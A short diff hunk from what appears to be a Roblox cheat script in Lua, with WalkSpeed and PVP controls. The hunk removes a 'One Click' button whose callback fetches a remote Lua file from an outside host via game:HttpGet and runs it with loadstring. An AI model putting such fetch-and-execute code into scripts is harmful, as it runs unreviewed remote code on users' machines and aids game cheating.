@@ -8274,13 +8274,6 @@ Input = PVP:AddInput("Input", {
          getgenv().WalkSpeed = Value
      end
 })
-kaitan = Window:AddTab({ Title = "Tab One Click", Icon = "" })
-kaitan:AddButton({
-    Title = "One Click",
-    Callback = function()
-    loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/73mkp0aqyfo4ypy8hvl0nz10lq49fey5.lua"))()
-    end
-})
 ----------------------------------------------------------------------------------------------------
 print("--[[ImageButton]]--")
 local Players = game:GetService("Players")
